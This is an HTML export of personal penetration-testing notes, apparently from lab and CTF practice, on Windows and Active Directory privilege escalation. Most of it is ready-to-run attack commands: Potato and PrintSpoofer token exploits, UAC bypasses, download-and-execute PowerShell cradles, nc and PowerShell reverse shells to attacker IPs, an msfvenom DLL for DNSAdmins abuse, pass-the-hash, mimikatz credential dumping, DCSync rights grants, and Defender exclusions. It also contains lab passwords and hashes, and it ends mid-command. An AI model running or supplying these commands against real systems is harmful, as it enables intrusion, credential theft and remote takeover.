/>Tater: less chance of success but easier to use.<br />	put Tater.ps1 on the target.<br />	powershell.exe -nop -ep bypass -c import-module .\Tater.ps1; Invoke-Tater -Trigger 1 -Command &quot;net localgroup administrators squid /add&quot;<br /><br /><a href="https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html">https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html</a><br /><a href="https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt">https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt</a><br /><br /><br /><br /></div><div class='page'><h1 class='title level-5'>Rotten Potato</h1><br/>Try to avoid this. Juicy potato is less handsy and has a higher success rate.<br /><br /><a href="https://github.com/decoder-it/lonelypotato">https://github.com/decoder-it/lonelypotato</a>  has a compiled version of the exploit<br /><a href="https://www.puckiestyle.nl/htb-bounty/">https://www.puckiestyle.nl/htb-bounty/</a>        has a great rightup on the use of lonely potato (even though they call it rotten potato)<br /><br />1.<br />make a file named rev.bat with the contents<br />    powershell.exe -c &quot;iex(new-object net.webclient).downloadstring(&#39;<a href="http://10.10.14.60:8000/ye32.ps1')"">http://10.10.14.60:8000/Invoke-PowerShellTcp.ps1&#39;)&quot;</a><br />2.<br />add a line to the bottom of Invoke-PowerShellTcp.ps1<br />    Invoke-PowershellTcp -Reverse -IPAddress 10.10.14.60 -port 3232<br />3.<br />pull lonely potato and rev.bat to the target<br />    powershell.exe -exec Bypass &quot;IEX (New-Object Net.WebClient).Downloadfile(&#39;<a href="http://10.10.14.60:8000/rev.bat',">http://10.10.14.60:8000/rev.bat&#39;,</a> &#39;C:\users\kohsuke\appdata\local\temp\rev.bat&#39;)&quot;<br />4.<br />start nc listener<br />    nc -nlvp 3232<br />5.<br />execute the lonely potato exploit (renamed to rp.exe)<br />    C:\users\kohsuke\appdata\local\temp\rp.exe * C:\users\kohsuke\appdata\local\temp\rev.bat<br />6.<br />    enjoy your system shell!</div><div class='page'><h1 class='title level-5'>Juicy Potato</h1><br/>Juicy Potao: A little more handsy, but good success rate.<br />	<a href="http://ohpe.it/juicy-potato/">http://ohpe.it/juicy-potato/</a> &lt; for best notes.<br />	If you have the SeImpersonatePrivilege or the SeAssignPrimaryPrivilege token, find the operating system of the machine and compare it to the following site to get the CLSID.<br />	<a href="https://ohpe.it/juicy-potato/CLSID/">https://ohpe.it/juicy-potato/CLSID/</a><br />	upload nc and juicy potato<br />	c:\users\public\jp.exe -l 1337 -p C:\windows\system32\cmd.exe -a &quot;/c C:\users\public\nc.exe -e cmd.exe 10.10.14.3 3233&quot; -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}<br />	<br />You can also start your own service shell.<br />	.\PSExec64.exe -i -u &quot;nt authority\local service&quot; C:\users\user\Desktop\Shell.exe<br />	JuicyPotato.exe -l 1337 -p C:\temp\shell32.exe -t * -c {F087771F-D74F-4C1A-BB8A-E16ACA9124EA}</div><div class='page'><h1 class='title level-5'>Rogue Potato</h1><br/>Rogue Potato takes advantage of a similar vulnerability to Juicy Potato. To my knowledge, this will work on modern windows 10. Needs kali to run a redirector to forward the shell.<br />	On Kali (.8 is the windows target)<br />		sudo socat tcp-listen:135,reuseaddr,fork tcp:192.168.11.8:9999<br />	On windows (.5 is the kali)<br />		.\PSExec64.exe /accepteula -i -u &quot;nt authority\local service&quot; C:\Users\user\Desktop\Shell.exe<br />		.\RoguePotato.exe -r 192.168.11.5 -l 9999 -e C:\temp\Shell32.exe -c &quot;{F087771F-D74F-4C1A-BB8A-E16ACA9124EA}&quot;<br /></div><div class='page'><h1 class='title level-5'>Print Spoofer</h1><br/>PrintSpoofer is another Token impersonation exploit that specifically takes advantage of the windows spooler service CLSID. (only works on windows 10)<br /><br />C:\temp\PSExec64.exe -accepteula -i -u &quot;nt authority\local service&quot; C:\temp\Shell.exe		(To simulate getting the service account)<br />C:\temp\PrintSpoofer.exe –i -c &quot;C:\temp\Shell.exe&quot;<br />.\printspoofer.exe -i -c C:\temp\Shell32.exe<br />--NOTE-- I found that calling printspoofer with a full path does not seem to work...</div><div class='page'><h1 class='title level-5'>msf</h1><br/>(not actually for tokens but super cool)<br />	use exploit/multi/script/web_delivery		(This is for making a one liner to copy into the target box and execute. This also starts the payload handler)<br /><br />if post/multi/recon/local_exploit_suggester suggests ms16_075_reflection or reflection_juicy, we are about to do a potato attack.<br /><br />use exploit/windows/local/ms16_075_reflection_juicy<br />run it to get your next shell<br />go into the session<br />load incognito<br />list_tokens -u<br />impersonate_token “NT Authority\system”<br />shell<br />(rooted)</div><div class='page'><h1 class='title level-5'>Details</h1><br/>What are tokens?<br />	Tokens are temporary keys that allow you access to a system/network without having to provide credentials each time you access a file. (cookies for computers)<br /><br />Two types of tokens:<br />	Delegate and Impersonate<br />	A delegate token is created for logging into a machine or using Remote Desktop.<br />	An impersonate token is “non-interactive” for use such as attaching a network drive or a domian logon script<br />	<br />View tokens with whoami /priv<br /><br />To see what you can do with those tokens check out these linksVV (SeImpersonate and SeAssignPrimaryToken are the biggies)<br /><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---impersonation-privileges">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---impersonation-privileges</a><br /><a href="https://github.com/gtworek/Priv2Admin">https://github.com/gtworek/Priv2Admin</a><br /><br /><br /><br />whoami /privs<br />    SeImpersonatePrivilege           &gt; rotten potato or Juicy potato<br />    SeAssignPrimaryPrivilege        &gt; Juicy potato<br />    SeTcbPrivilege<br />    SeBackupPrivilege<br />    SeRestorePrivilege<br />    SeCreateTokenPrivilege<br />    SeLoadDriverPrivilege<br />    SeTakeOwnershipPrivilege<br />    SeDebugPrivilege<br /><a href="https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/">https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/</a><br /><br />You will most likely be able to do it with a service account.<br /><br />windows 7 and 2008r2 until 2016 are affected<br /></div><div class='page'><h1 class='title level-4'>High Integrity admin to System</h1><br/>Go from Admin with High context integrity to system<br />	.\PsExec64.exe -accepteula -i -s C:\users\admin\Desktop\Shell32.exe  (You will need to bring over Psexec64 and Shell32.exe)</div><div class='page'><h1 class='title level-3'>UAC Bypass</h1><br/>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System             <br />                                                 <br />HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System<br />    ConsentPromptBehaviorAdmin    REG_DWORD    0x5                      <br /><br /><br />Value				Meaning<br /><br />0x00000000  This option allows the Consent Admin to perform an operation that requires elevation without consent or credentials.<br /><br />0x00000001  This option prompts the Consent Admin to enter his or her user name and password (or another valid admin) when an operation requires elevation of privilege. This operation occurs on the secure desktop.<br /><br />0x00000002  This option prompts the administrator in Admin Approval Mode to select either &quot;Permit&quot; or &quot;Deny&quot; an operation that requires elevation of privilege. If the Consent Admin selects Permit, the operation will continue with the highest available privilege. &quot;Prompt for consent&quot; removes the inconvenience of requiring that users enter their name and password to perform a privileged task. This operation occurs on the secure desktop.<br /><br />0x00000003		This option prompts the Consent Admin to enter his or her user name and password (or that of another valid admin) when an operation requires elevation of privilege.<br /><br />0x00000004		This prompts the administrator in Admin Approval Mode to select either &quot;Permit&quot; or &quot;Deny&quot; an operation that requires elevation of privilege. If the Consent Admin selects Permit, the operation will continue with the highest available privilege. &quot;Prompt for consent&quot; removes the inconvenience of requiring that users enter their name and password to perform a privileged task.<br /><br />0x00000005		This option is the default. It is used to prompt the administrator in Admin Approval Mode to select either &quot;Permit&quot; or &quot;Deny&quot; for an operation that requires elevation of privilege for any non-Windows binaries. If the Consent Admin selects Permit, the operation will continue with the highest available privilege. This operation will happen on the secure desktop.&lt;8&gt;</div><div class='page'><h1 class='title level-4'>Invoke-EventVwrBypass.ps1 (Fileless)</h1><br/><a href="https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-EventVwrBypass.ps1">https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-EventVwrBypass.ps1</a><br /><a href="https://github.com/enigma0x3/Misc-PowerShell-Stuff">https://github.com/enigma0x3/Misc-PowerShell-Stuff</a><br /><a href="https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/">https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/</a><br /><br />. .\Invoke-EventVwrBypass.ps1<br />Invoke-EventVwrBypass -Command &quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc IgBJAHMAIABFAGwAZQB2AGEAdABlAGQAOgAgACQAKAAoAFsAUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAFAAcgBpAG4AYwBpAHAAYQBsAF0AWwBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMASQBkAGUAbgB0AGkAdAB5AF0AOgA6AEcAZQB0AEMAdQByAHIAZQBuAHQAKAApACkALgBJAHMASQBuAFIAbwBsAGUAKABbAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AVwBpAG4AZABvAHcAcwBCAHUAaQBsAHQASQBuAFIAbwBsAGUAXQAnAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAJwApACkAIAAtACAAJAAoAEcAZQB0AC0ARABhAHQAZQApACIAIAB8ACAATwB1AHQALQBGAGkAbABlACAAQwA6AFwAVQBBAEMAQgB5AHAAYQBzAHMAVABlAHMAdAAuAHQAeAB0ACAALQBBAHAAcABlAG4AZAA=&quot;</div><div class='page'><h1 class='title level-4'>UACME</h1><br/><a href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a><br /><br /><a href=""><img src="images/1791-1.png" alt="images/1791-1.png" /></a>  &lt;&lt;61 is also to have  a high success ratee on x64 boxes<br /><br />certutil -urlcache -split -f &quot;<a href="http://192.168.119.132:8080/UACME/ucrtbased.dll"">http://192.168.119.132:8080/UACME/akagi.exe</a>&quot;<br />certutil -urlcache -split -f &quot;<a href="http://192.168.119.132:8080/UACME/ucrtbased.dll"">http://192.168.119.132:8080/UACME/ucrtbased.dll</a>&quot;<br />certutil -urlcache -split -f &quot;<a href="http://192.168.119.132:8080/UACME/vcruntime140d.dll">http://192.168.119.132:8080/UACME/vcruntime140d.dll</a>&quot;<br />	certutil -urlcache -split -f &quot;<a href="http://192.168.119.132:8080/UACME/vcruntime140d.dll">http://192.168.119.132:8080/UACME/</a>SOMESHELLCODE.exe&quot;<br /><br />.\akagi.exe 9 C:\users\administrator\desktop\53_132.exe<br />.\akagi.exe 22 C:\users\administrator\desktop\53_132.exe<br />.\akagi.exe 23 C:\users\administrator\desktop\53_132.exe<br />.\akagi.exe 24 C:\users\administrator\desktop\53_132.exe</div><div class='page'><h1 class='title level-3'>File Movement</h1><br/><div class="codebox"><div class="codebox">#Bitstransfer<br />import-module&nbsp;bitstransfer<br />start-bitstransfer&nbsp;http://10.10.14.60:8000/yee.txt<br /><br />#Certutil<br />certutil.exe&nbsp;-urlcache&nbsp;-split&nbsp;-f&nbsp;&quot;http://10.11.0.186:8000/MS16-032.ps1&quot;<br /><br />#Bitsadmin<br />bitsadmin&nbsp;/transfer&nbsp;Ms16032Job&nbsp;/download&nbsp;http://10.10.14.60/Invoke-MS16032.ps1&nbsp;C:\users\kostas\Downloads\Invoke-MS16032.ps1<br /><br />#PowerShell<br />powershell&nbsp;-NoProfile&nbsp;-ExecutionPolicy&nbsp;unrestricted&nbsp;-Command&nbsp;(new-object&nbsp;System.Net.WebClient).Downloadfile(&#39;http://10.10.10.10:7000/iw4455.exe&#39;,&nbsp;&#39;C:\windows\temp\iw4455.exe&#39;)<br />echo&nbsp;IEX(New-Object&nbsp;Net.WebClient).downloadString(&#39;http://10.11.0.186:8000/PowerUp.ps1&#39;)&nbsp;&nbsp;|&nbsp;powershell&nbsp;-noprofile&nbsp;-<br />C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe&nbsp;-NoProfile&nbsp;-ExecutionPolicy&nbsp;unrestricted&nbsp;-Command&nbsp;(new-object&nbsp;System.Net.WebClient).Downloadfile(&#39;http://10.11.0.186/lse.sh&#39;,&#39;C:\HFS\sac\lse.sh&#39;)<br />powershell&nbsp;-c&nbsp;Invoke-WebRequest&nbsp;&quot;http://10.10.14.8/nc.exe&quot;&nbsp;-Outfile&nbsp;&quot;C:\temp\nc.exe&quot;<br />powershell.exe&nbsp;-ExecutionPolicy&nbsp;Bypass&nbsp;-NoLogo&nbsp;-NonInteractive&nbsp;-NoProfile&nbsp;-File&nbsp;Sherlock.ps1<br /><br />#PowerShell&nbsp;in&nbsp;Memory<br />powershell.exe&nbsp;-exec&nbsp;Bypass&nbsp;&quot;IEX&nbsp;(New-Object&nbsp;Net.WebClient).DownloadString(&#39;http://10.11.0.186/Sherlock.ps1&#39;)&quot;<br /><br />#FTP<br />	#On&nbsp;Kali<br />	apt-get&nbsp;install&nbsp;python-pyftpdlib<br />	python&nbsp;-m&nbsp;pyftpdlib&nbsp;-p&nbsp;21&nbsp;-w<br />	#On&nbsp;Target<br />	echo&nbsp;import&nbsp;ftplib&nbsp;&gt;&nbsp;yeet.txt<br />	echo&nbsp;ftp=ftplib.FTP(&#39;10.11.0.186&#39;)&nbsp;&gt;&gt;&nbsp;yeet.txt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;&lt;&lt;CHANGE&nbsp;IP<br />	echo&nbsp;ftp.login(&#39;anonymous&#39;,&#39;x&#39;)&nbsp;&gt;&gt;&nbsp;yeet.txt<br />	echo&nbsp;ftp.retrbinary(&#39;RETR&nbsp;3232.asp&#39;,open(&#39;3232.asp&#39;,&#39;wb&#39;).write)&nbsp;&gt;&gt;&nbsp;yeet.txt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;&lt;&lt;REPLACE&nbsp;FILES<br />	echo&nbsp;ftp.quit()&nbsp;&gt;&gt;&nbsp;yeet.txt<br /><br />#FTP&nbsp;one&nbsp;liner<br />	c:\python27\python.exe&nbsp;-c&nbsp;&quot;import&nbsp;ftplib;ftp=ftplib.FTP(&#39;10.11.0.186&#39;);ftp.login(&#39;anonymous&#39;,&#39;x&#39;);ftp.retrbinary(&#39;RETR&nbsp;3232.asp&#39;,open(&#39;3232.asp&#39;,&#39;wb&#39;).write);ftp.quit()&quot;<br /><br />#FTP&nbsp;Service&nbsp;One&nbsp;Liner<br />	#On&nbsp;Kali<br />	python3&nbsp;-m&nbsp;pip&nbsp;install&nbsp;pyftpdlib<br />	python3&nbsp;-m&nbsp;pyftpdlib&nbsp;-p&nbsp;21<br />	#On&nbsp;Target<br />	echo&nbsp;open&nbsp;192.168.119.132&gt;ftp_commands.txt&amp;echo&nbsp;anonymous&gt;&gt;ftp_commands.txt&amp;echo&nbsp;password&gt;&gt;ftp_commands.txt&amp;echo&nbsp;binary&gt;&gt;ftp_commands.txt&amp;echo&nbsp;put&nbsp;20210616120249_BloodHound.zip&gt;&gt;ftp_commands.txt&amp;echo&nbsp;bye&gt;&gt;ftp_commands.txt&amp;ftp&nbsp;-s:ftp_commands.txt<br /><br />#SMB<br />	#On&nbsp;Kali<br />	python3&nbsp;/usr/share/doc/python3-impacket/examples/smbserver.py&nbsp;tools&nbsp;`pwd`<br />	#or<br />	python3&nbsp;/usr/share/doc/python3-impacket/examples/smbserver.py&nbsp;-smb2support&nbsp;tools&nbsp;`pwd`<br />	#On&nbsp;Target<br />	dir&nbsp;\\192.168.11.5\tools\<br />	copy&nbsp;\\192.168.11.5\tools\file.exe&nbsp;.<br />	#Possibly&nbsp;needed&nbsp;fixes<br />	Get-WindowsOptionalFeature&nbsp;-Online&nbsp;-FeatureName&nbsp;&quot;SMB1Protocol&quot;<br />	Enable-WindowsOptionalFeature&nbsp;-Online&nbsp;-FeatureName&nbsp;&quot;SMB1Protocol-Client&quot;&nbsp;-All<br />	optionalfeatures.exe<br />	#Get&nbsp;Files&nbsp;Off&nbsp;Of&nbsp;Windows<br />	KALI<br />&nbsp;&nbsp;&nbsp;&nbsp;	smbserver.py&nbsp;YEET&nbsp;&#39;pwd&#39;&nbsp;-smb2support&nbsp;-username&nbsp;squid&nbsp;-password&nbsp;squidpower<br />	Target<br />&nbsp;&nbsp;&nbsp;&nbsp;net&nbsp;use&nbsp;x:&nbsp;\\192.168.119.132\yeet&nbsp;/user:squid&nbsp;squid<br />&nbsp;&nbsp;&nbsp;&nbsp;x:<br />	now&nbsp;you&nbsp;can&nbsp;copy&nbsp;things&nbsp;between&nbsp;machines<br />	This&nbsp;will&nbsp;also&nbsp;dump&nbsp;you&nbsp;the&nbsp;users&nbsp;hash.</div></div></div><div class='page'><h1 class='title level-3'>Got Creds?</h1><br/><div class="codebox"><div class="codebox">#for&nbsp;real&nbsp;admin&nbsp;creds&nbsp;over&nbsp;SMB<br />	winexe&nbsp;-U&nbsp;jenkins/administrator%S1TjAtJHKsugh9oC4VZl&nbsp;//10.10.10.63&nbsp;cmd.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />	winexe&nbsp;-U&nbsp;jenkins/administrator&nbsp;//10.10.10.63&nbsp;cmd.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;will&nbsp;prompt&nbsp;you&nbsp;for&nbsp;creds<br />	<br />#for&nbsp;admin&nbsp;NTLM&nbsp;Hashes&nbsp;over&nbsp;SMB<br />	pth-winexe&nbsp;-U&nbsp;jenkins/administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00&nbsp;//10.10.10.63&nbsp;cmd.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />	pth-winexe&nbsp;-U&nbsp;jenkins/administrator&nbsp;//10.10.10.63&nbsp;cmd.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;will&nbsp;prompt&nbsp;you&nbsp;for&nbsp;creds<br />&nbsp;&nbsp;&nbsp;&nbsp;#Or<br />	psexec.py&nbsp;htb/administrator:PASSWORD@10.10.10.161<br />	psexec.py&nbsp;htb/administrator@10.10.10.161&nbsp;-hashes&nbsp;aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6&nbsp;-dc-ip&nbsp;10.10.10.161<br /><br />#for&nbsp;real&nbsp;non-admin&nbsp;creds&nbsp;over&nbsp;SMB<br />	smbmap&nbsp;-u&nbsp;prtgadmin&nbsp;-p&nbsp;PrTg@dmin2019&nbsp;-d&nbsp;netmon&nbsp;-H&nbsp;10.10.10.125&nbsp;-x&nbsp;whoami<br /><br />#for&nbsp;real&nbsp;creds&nbsp;over&nbsp;WinRm<br />	ruby&nbsp;evil-winrm.rb&nbsp;-i&nbsp;10.10.10.169&nbsp;-u&nbsp;melanie&nbsp;-p&nbsp;&#39;Welcome123!&#39;&nbsp;<br /><br />#for&nbsp;cmdkey&nbsp;/list&nbsp;creds<br />	runas&nbsp;/savecred&nbsp;/user:WORKGROUP\Administrator&nbsp;&quot;nc.exe&nbsp;-e&nbsp;cmd.exe&nbsp;10.10.14.3&nbsp;3232&quot;<br /><br />#Real&nbsp;creds&nbsp;internal<br />	C:\Windows\System32\runas.exe&nbsp;/env&nbsp;/noprofile&nbsp;/user:&lt;username&gt;&nbsp;&lt;password&gt;&nbsp;&quot;c:\users\Public\nc.exe&nbsp;-nc&nbsp;&lt;attacker-ip&gt;&nbsp;4444&nbsp;-e&nbsp;cmd.exe&quot;<br /><br />#Real&nbsp;creds&nbsp;internal&nbsp;2<br />	$secpasswd&nbsp;=&nbsp;ConvertTo-SecureString&nbsp;&quot;&lt;password&gt;&quot;&nbsp;-AsPlainText&nbsp;-Force<br />	$mycreds&nbsp;=&nbsp;New-Object&nbsp;System.Management.Automation.PSCredential&nbsp;(&quot;&lt;user&gt;&quot;,&nbsp;$secpasswd)<br />	$computer&nbsp;=&nbsp;&quot;&lt;hostname&gt;&quot;<br />	[System.Diagnostics.Process]::Start(&quot;C:\users\public\nc.exe&quot;,&quot;&lt;attacker_ip&gt;&nbsp;4444&nbsp;-e&nbsp;cmd.exe&quot;,&nbsp;$mycreds.Username,&nbsp;$mycreds.Password,&nbsp;$computer)<br />	#https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---runas<br /><br />#Powershell&nbsp;Cred&nbsp;Useage&nbsp;1<br />	$secpass&nbsp;=&nbsp;ConvertTo-SecureString&nbsp;&quot;corporate568&quot;&nbsp;-AsPlainText&nbsp;-Force<br />	$cred&nbsp;=&nbsp;New-Object&nbsp;System.Management.Automation.PSCredential(&quot;mssql-svc&quot;,$secpass)<br />	invoke-command&nbsp;-computername&nbsp;localhost&nbsp;-ScriptBlock&nbsp;{&nbsp;whoami&nbsp;}&nbsp;-Credential&nbsp;$cred<br />	<br />#Connect&nbsp;to&nbsp;Share&nbsp;with&nbsp;Creds<br />	net&nbsp;use&nbsp;x:&nbsp;\\localhost\c$&nbsp;/user:admin&nbsp;password123<br />	x:</div></div><br /><br /><br />C:\Windows\System32\runas.exe /env /noprofile /user:administrator &quot;<strong>Enable</strong>-WindowsOptionalFeature -Online -FeatureName &#39;SMB1Protocol&#39; -All&quot;<br /><br /><br /><br /></div><div class='page'><h1 class='title level-3'>Extra Stuff</h1><br/></div><div class='page'><h1 class='title level-4'>AD</h1><br/>net user<br />net user /domain<br />net user Yeet_admin /domain<br />net group /domain<br /><br />powershell<br />##############AdEnum.ps1<br />$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() <br /> <br />$PDC = ($domainObj.PdcRoleOwner).Name <br /> <br />$SearchString = &quot;LDAP://&quot; $SearchString += $PDC + &quot;/&quot; <br /> <br />$DistinguishedName = &quot;DC=$($domainObj.Name.Replace(&#39;.&#39;, &#39;,DC=&#39;))&quot; <br /> <br />$SearchString += $DistinguishedName <br /> <br />$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString) <br /> <br />$objDomain = New-Object System.DirectoryServices.DirectoryEntry <br /> <br />$Searcher.SearchRoot = $objDomain <br /> <br />$Searcher.filter=&quot;samAccountType=805306368&quot; <br />#$Searcher.filter=&quot;name=yeeter_skeeter&quot;<br />#$Searcher.filter=&quot;(objectClass=Group)&quot;<br />#$Searcher.filter=&quot;serviceprincipalname=*http*&quot;<br /> <br />$Result = $Searcher.FindAll() <br /> <br />Foreach($obj in $Result)<br />{     <br />	Foreach($prop in $obj.Properties)     <br />	{         <br />		$prop     <br />	} <br />} <br />######################<br /><br />import-module PowerView.ps1<br />get-netloggedon -ComputerName yeecompuyee<br />get-netsession -ComputerName yeeDC01yee<br /><br />mimikatz.exe<br />privilege::debug<br />sekurlsa::logonpasswords<br />sekurlsa::tickets<br />kerberos::list /export<br /><br /><br />add-type -assemblyname system.identitymodel<br />New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &#39;HTTP/CorpWebServer.corp.com&#39; <br />klist<br /><br />net accounts</div><div class='page'><h1 class='title level-5'>Bloodhound</h1><br/></div><div class='page'><h1 class='title level-6'>bloodhound</h1><br/>neo4j console                             to start neo4j<br />bloodhound  --nosandbox            username neo4j      password bloodhound<br /><br />Move SharpHound (.ps1 or .exe) to the target machine<br /><br />on target machine<br />.\SharpHound.exe -h         &lt; will show you help<br />.\SharpHound.exe -c all     &lt; will start collector and create a .zip file with all of the data.<br />.\SharpHound.exe --ldapusername svc-alfresco --ldappassword s3rvice -c all<br /><br /><br />move xxx_bloodhoud.zip back onto kali and drop into bloodhound page</div><div class='page'><h1 class='title level-6'>powerview</h1><br/>IEX(New-object net.webclient).downloadstring(&#39;http://10.10.14.60:8080/PV.ps1&#39;)                      &lt;&lt;At the bottom is the link to this old powerview.<br />$pass = convertto-securestring ‘YeeYeeYee’ -AsPlainText -Force<br />$cred = new-object system.management.automation.pscredential(&#39;htb\squid&#39;, $pass)<br />Add-DomainObjectAcl -credential $cred -targetidentity &quot;DC=htb,DC=local&quot; -PrincipalIdentity squid -rights DCSync<br /><br /><br /><br /><br /><br /><br />VVVVVVVVVOnly Old PowerView is Functional With Bloodhound!!!!!!VVVVVVVVV<br /><a href="https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/powerview.ps1">https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/powerview.ps1</a></div><div class='page'><h1 class='title level-4'>ADS</h1><br/>dir /r<br />    hm.txt:root.txt:$DATA<br />more &lt; hm.txt:root.txt:$DATA<br /><br />powershell (get-content hm.txt -stream root.txt)<br /><br />dir -force<br /><br />in smbclient<br />    allinfo “filename”          ( in stream you&#39;ll be able to see the keyword)<br />    get &quot;Filename:keyword&quot;      File ADS has been dumped to the kali box. Cat it and win the war.<br /><br /><a href="https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/">https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/</a></div><div class='page'><h1 class='title level-4'>Firewalls/Anti-Virus</h1><br/><br /></div><div class='page'><h1 class='title level-5'>Real Time Protection</h1><br/><br /></div><div class='page'><h1 class='title level-6'>Folder Exclusion</h1><br/>Add-MpPreference -ExclusionPath &quot;c:\tools&quot;</div><div class='page'><h1 class='title level-5'>windows firewall</h1><br/>allow inbound connection on port 3232 via powershell<br />    New-NetFirewallRule -DisplayName &#39;nc remote connect&#39; -profile Any -Direction Inbound -Action allow -Protocol TCP -localport 3232<br /></div><div class='page'><h1 class='title level-4'>Groups</h1><br/>See a wierd group?<br />google  <br />    DCSync “wierd group name”<br />    DCSync azure admins<br /></div><div class='page'><h1 class='title level-5'>azure admins</h1><br/>If you are in the Azure Admins group prepare to be root<br />this was also done in moteverde (htb, 172)<br />This githpub page has the code you want. view it raw and copy it into a file. If this no longer exists it is in Monteverde<br /><a href="https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1">https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1</a><br /><br />&lt;load .\Azure-ADConnect.ps1 into memory&gt;<br />import-module .\Azure-ADConnect.ps1<br />&lt;execute&gt;<br />Azure-ADConnect -server 10.10.10.172 -db ADSync<br />&lt;enjoy your creds&gt;<br /><br />[+] Domain:  MEGABANK.LOCAL<br />[+] Username: administrator<br />[+]Password: d0m@in4dminyeah!<br /><br /></div><div class='page'><h1 class='title level-5'>dns admins</h1><br/>whoami /groups<br />    dnsadmins<br />    <br />msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.60 LPORT=3232 -f dll &gt; yee.dll<br />nc -nlvp 3232<br />sudo bash<br />smbserver.py yeet `pwd`<br /><br />net view \\10.10.14.60<br />dnscmd.exe resolute.megabank.local /config /serverlevelplugindll \\10.10.14.60\yeet\yee.dll<br />sc.exe stop dns<br />sc.exe start dns<br />sc.exe query dns<br />...enjoy your shell!<br /><br /><br /><br /><br /><a href="https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2">https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2</a></div><div class='page'><h1 class='title level-4'>Locate</h1><br/>where /R c:\windows bash.exe<br /><br />cd c:\windows &amp;&amp; dir /s /b | findstr bash.exe<br /></div><div class='page'><h1 class='title level-4'>Lock Workstation</h1><br/>c:\windows\system32\rundll32.exe user32.dll,LockWorkStation<br /></div><div class='page'><h1 class='title level-4'>nc shell One-liner</h1><br/>if in cmd<br /><br />powershell -nop -exec bypass -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&#39;10.10.14.60&#39;,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;<br /><br />if in powershell<br /><br />$client = New-Object System.Net.Sockets.TCPClient(&#39;10.10.14.60&#39;,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex 